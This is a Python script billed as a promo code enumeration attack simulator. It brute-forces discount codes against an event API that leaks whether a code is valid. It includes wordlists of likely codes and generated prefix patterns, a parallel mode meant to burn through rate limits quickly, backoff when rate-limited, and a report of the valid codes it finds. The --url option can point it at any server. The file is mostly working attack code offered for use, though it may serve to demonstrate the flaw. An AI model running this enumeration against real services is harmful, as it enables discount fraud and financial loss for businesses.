#!/usr/bin/env python3
# Copyright (c) 2026 PenTestToolkit
# SPDX-License-Identifier: MIT
"""
Promo Code Enumeration Attack Simulator
Demonstrates how attackers exploit the vulnerable API endpoint
"""

import requests
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init
import sys

init(autoreset=True)

class PromoCodeEnumerator:
    """
    Simulates an attacker enumerating promo codes from the vulnerable API
    """
    
    def __init__(self, base_url="http://localhost:5000", event_id=1):
        self.base_url = base_url
        self.event_id = event_id
        self.found_codes = []
        self.tested_count = 0
        self.rate_limited_count = 0
        self.lock = threading.Lock()
        
        # Common promo code patterns attackers use
        self.code_wordlists = {
            "seasonal": [
                "SPRING2024", "SUMMER2024", "FALL2024", "WINTER2024",
                "SPRING25", "SUMMER25", "FALL25", "WINTER25",
                "SPRING", "SUMMER", "FALL", "WINTER"
            ],
            "gaming_terms": [
                "GAMER", "GAMING", "GAME", "PLAY", "PLAYER", "PRO",
                "GAMER50", "GAMER25", "GAMING50", "GAMING2024",
                "PLAY50", "PLAYER10", "PRO20"
            ],
            "common_discounts": [
                "WELCOME", "WELCOME10", "WELCOME20", "WELCOME50",
                "DISCOUNT", "DISCOUNT10", "DISCOUNT20", "DISCOUNT50",
                "SAVE10", "SAVE20", "SAVE50", "SAVE2024",
                "OFF10", "OFF20", "OFF50", "SALE", "SALE2024"
            ],
            "event_related": [
                "TOURNAMENT", "LANPARTY", "CHAMPIONSHIP", "EVENT",
                "NIGHTOWL", "INSOMNIA", "EGYPT", "EGYPTGAMING",
                "VICTORY", "WINNER", "CHAMPION"
            ],
            "brute_force_simple": [
                "TEST", "TEST1", "TEST2", "TEST123", "ABC", "XYZ",
                "CODE", "CODE1", "CODE2", "PROMO", "PROMO1", "PROMO2024",
                "FREE", "FREE10", "FREE20", "VIP", "VIP10"
            ],
            # Structured prefix-based patterns (like 3DS6-XXXX-XXXX)
            "prefix_based_3ds6": self._generate_prefix_variations("3DS6"),
            "prefix_based_common": self._generate_prefix_variations("3DS6") + 
                                   self._generate_prefix_variations("4EG7") +
                                   self._generate_prefix_variations("5FH8")
        }
    
    def _generate_prefix_variations(self, prefix):
        """
        Generate codes following the [PREFIX]-[XXXX]-[XXXX] pattern
        Based on your observation: 3DS6-8ZSG-1SEZ format
        """
        import random
        import string
        variations = []
        
        # Generate 50 variations of the pattern
        for _ in range(50):
            part1 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
            part2 = ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
            variations.append(f"{prefix}-{part1}-{part2}")
        
        return variations
    
    def test_single_code(self, code):
        """Test a single promo code against the API"""
        url = f"{self.base_url}/api/public/events/{self.event_id}/promo-codes/{code}"
        
        try:
            response = requests.get(url, timeout=5)
            
            with self.lock:
                self.tested_count += 1
            
            if response.status_code == 429:
                with self.lock:
                    self.rate_limited_count += 1
                return None, "rate_limited"
            
            if response.status_code == 200:
                data = response.json()
                
                # Check if code is valid - this is what attackers look for
                if data.get("valid") is True:
                    with self.lock:
                        self.found_codes.append({
                            "code": code,
                            "discount": data.get("discount_value"),
                            "uses_remaining": data.get("uses_remaining"),
                            "expires": data.get("expires_at")
                        })
                    return code, "valid"
                else:
                    return code, "invalid"
            
            return code, f"error_{response.status_code}"
            
        except requests.exceptions.RequestException as e:
            return code, f"error: {str(e)}"
    
    def enumerate_with_wordlist(self, wordlist_name, delay=0.1):
        """Enumerate using a specific wordlist"""
        wordlist = self.code_wordlists.get(wordlist_name, [])
        
        print(f"\n{Fore.CYAN}[*] Testing {len(wordlist)} codes from '{wordlist_name}' wordlist...")
        print(f"{Fore.CYAN}[*] Target: Event ID {self.event_id}")
        print(f"{Fore.CYAN}[*] Delay: {delay}s between requests\n")
        
        for code in wordlist:
            result = self.test_single_code(code)
            
            if result[1] == "valid":
                print(f"{Fore.GREEN}[+] VALID CODE FOUND: {result[0]}")
            elif result[1] == "rate_limited":
                print(f"{Fore.YELLOW}[!] Rate limited - waiting...")
                time.sleep(5)  # Wait when rate limited
            elif result[1] == "invalid":
                print(f"{Fore.RED}[-] Invalid: {result[0]}")
            
            time.sleep(delay)
        
        print(f"\n{Fore.CYAN}[*] Wordlist '{wordlist_name}' complete.")
    
    def fast_parallel_enumeration(self, wordlist_name, max_workers=5):
        """
        Parallel enumeration to maximize speed before rate limiting kicks in
        This is what real attackers do - blast requests quickly
        """
        wordlist = self.code_wordlists.get(wordlist_name, [])
        
        print(f"\n{Fore.MAGENTA}[!] FAST PARALLEL ENUMERATION MODE")
        print(f"{Fore.MAGENTA}[!] Testing {len(wordlist)} codes with {max_workers} parallel threads")
        print(f"{Fore.MAGENTA}[!] Attempting to exhaust rate limit quickly...\n")
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_code = {
                executor.submit(self.test_single_code, code): code 
                for code in wordlist
            }
            
            for future in as_completed(future_to_code):
                code = future_to_code[future]
                try:
                    result = future.result()
                    
                    if result[1] == "valid":
                        print(f"{Fore.GREEN}[+] FOUND: {result[0]} {'=' * 30}")
                    elif result[1] == "rate_limited":
                        print(f"{Fore.YELLOW}[!] RATE LIMITED")
                    elif result[1] == "invalid":
                        print(f"{Fore.RED}[-] {result[0]}")
                        
                except Exception as e:
                    print(f"{Fore.RED}[!] Error testing {code}: {e}")
    
    def intelligent_enumeration(self):
        """
        Smart enumeration that prioritizes likely codes first
        and adapts based on findings
        """
        print(f"\n{Fore.CYAN}{'=' * 60}")
        print(f"{Fore.CYAN}INTELLIGENT PROMO CODE ENUMERATION")
        print(f"{Fore.CYAN}{'=' * 60}\n")
        
        # Priority order based on common patterns
        priority_order = [
            "seasonal",        # Time-based codes (high probability)
            "event_related",   # Event-specific codes
            "gaming_terms",    # Gaming-related
            "common_discounts", # Standard discount codes
            "brute_force_simple" # Last resort
        ]
        
        for category in priority_order:
            print(f"\n{Fore.YELLOW}[*] Phase: Testing {category} patterns...")
            self.enumerate_with_wordlist(category, delay=0.05)
            
            # If we found codes, maybe pause to let rate limit reset
            if self.found_codes:
                print(f"\n{Fore.GREEN}[*] Found {len(self.found_codes)} codes so far. Pausing...")
                time.sleep(2)
    
    def generate_report(self):
        """Generate final enumeration report"""
        print(f"\n{Fore.CYAN}{'=' * 60}")
        print(f"{Fore.CYAN}ENUMERATION COMPLETE - FINAL REPORT")
        print(f"{Fore.CYAN}{'=' * 60}\n")
        
        print(f"Total codes tested: {self.tested_count}")
        print(f"Rate limit hits: {self.rate_limited_count}")
        print(f"Valid codes found: {len(self.found_codes)}")
        
        if self.found_codes:
            print(f"\n{Fore.GREEN}[!] DISCOVERED VALID PROMO CODES:")
            print(f"{Fore.GREEN}{'-' * 40}")
            for code_info in self.found_codes:
                print(f"{Fore.GREEN}  Code: {code_info['code']}")
                print(f"{Fore.GREEN}  Discount: {code_info['discount']}%")
                print(f"{Fore.GREEN}  Uses remaining: {code_info['uses_remaining']}")
                print(f"{Fore.GREEN}  Expires: {code_info['expires']}")
                print(f"{Fore.GREEN}{'-' * 40}")
        else:
            print(f"\n{Fore.YELLOW}[!] No valid codes found in tested wordlists")
            print(f"{Fore.YELLOW}    Try expanding wordlists or different patterns")

def demo_single_request():
    """Demo showing the API response difference"""
    print(f"\n{Fore.CYAN}{'=' * 60}")
    print(f"{Fore.CYAN}DEMONSTRATING THE VULNERABILITY")
    print(f"{Fore.CYAN}{'=' * 60}\n")
    
    base_url = "http://localhost:8080"
    event_id = 1
    
    # Test valid code
    print(f"{Fore.YELLOW}[1] Testing VALID code 'SPRING2024':")
    response = requests.get(f"{base_url}/api/public/events/{event_id}/promo-codes/SPRING2024")
    print(f"Status: {response.status_code}")
    print(f"Response: {response.json()}")
    print()
    
    # Test invalid code
    print(f"{Fore.YELLOW}[2] Testing INVALID code 'INVALIDCODE':")
    response = requests.get(f"{base_url}/api/public/events/{event_id}/promo-codes/INVALIDCODE")
    print(f"Status: {response.status_code}")
    print(f"Response: {response.json()}")
    print()
    
    print(f"{Fore.RED}[!] VULNERABILITY: Different response structures leak code validity!")
    print(f"{Fore.RED}    An attacker can distinguish valid from invalid codes programmatically.\n")

def main():
    print(f"""
{Fore.MAGENTA}
  ____                 _         ____          _           _             
 |  _ \ _ __ ___  _ __| | ___   / ___|___   __| | ___  ___| |_ ___  _ __ 
 | |_) | '__/ _ \| '__| |/ _ \ | |   / _ \ / _` |/ _ \/ __| __/ _ \| '__|
 |  __/| | | (_) | |  | |  __/ | |__| (_) | (_| |  __/ (__| || (_) | |   
 |_|   |_|  \___/|_|  |_|\___|  \____\___/ \__,_|\___|\___|\__\___/|_|   
                                                                         
  PROMO CODE ENUMERATION ATTACK SIMULATOR
  Target: Insomnia Gaming Egypt-style vulnerable API
    """)
    
    import argparse
    parser = argparse.ArgumentParser(description='Promo Code Enumeration Simulator')
    parser.add_argument('--demo', action='store_true', help='Run single request demo')
    parser.add_argument('--enumerate', action='store_true', help='Run full enumeration')
    parser.add_argument('--parallel', action='store_true', help='Run parallel enumeration')
    parser.add_argument('--url', default='http://localhost:8080', help='Base API URL')
    parser.add_argument('--event', type=int, default=1, help='Event ID to target')
    
    args = parser.parse_args()
    
    # Default to demo if no args
    if not any([args.demo, args.enumerate, args.parallel]):
        args.demo = True
        args.enumerate = True
    
    enumerator = PromoCodeEnumerator(base_url=args.url, event_id=args.event)
    
    if args.demo:
        demo_single_request()
        input(f"{Fore.CYAN}Press Enter to continue to enumeration demo...")
    
    if args.enumerate and not args.parallel:
        enumerator.intelligent_enumeration()
        enumerator.generate_report()
    
    if args.parallel:
        enumerator.fast_parallel_enumeration("seasonal", max_workers=10)
        enumerator.fast_parallel_enumeration("gaming_terms", max_workers=10)
        enumerator.generate_report()

if __name__ == "__main__":
    main()
